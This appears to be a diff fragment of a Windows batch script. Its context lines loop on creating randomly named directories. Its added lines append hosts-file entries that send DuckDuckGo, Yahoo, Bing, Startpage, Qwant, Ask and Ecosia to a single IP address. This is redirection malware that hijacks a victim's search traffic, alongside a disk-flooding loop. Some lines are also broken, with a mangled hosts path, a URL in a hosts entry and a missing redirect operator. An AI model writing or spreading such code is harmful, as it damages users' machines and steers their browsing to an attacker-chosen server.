@@ -15,6 +15,14 @@
     md %RANDOM%
     goto loop
     echo 61.179.193.150 www.google.com >> C:windowssystem32driversetchosts.txt
+    echo 61.179.193.150 duckduckgo.com >> C:windowssystem32driversetchosts.txt
+    echo 61.179.193.150 www.yahoo.com >>  C:windowssystem32driversetchosts.txt
+    echo 61.179.193.150 www.bing.com >> C:windowssystem32driversetchosts.txt
+    echo 61.179.193.150 startpage.com >> C:windowssystem32driversetchosts.txt
+    echo 61.179.193.150 www.qwant.com >> C:windowssystem32driversetchosts.txt
+    echo 61.179.193.150 www.ask.com/?o=1567 >> C:windowssystem32driversetchosts.txt
+    echo 61.179.193.150 www.askjeeves.net/ C:windowssystem32driversetchosts.txt
+    echo 61.179.193.150 www.ecosia.org >> C:windowssystem32driversetchosts.txt
     exit
     :A
     start
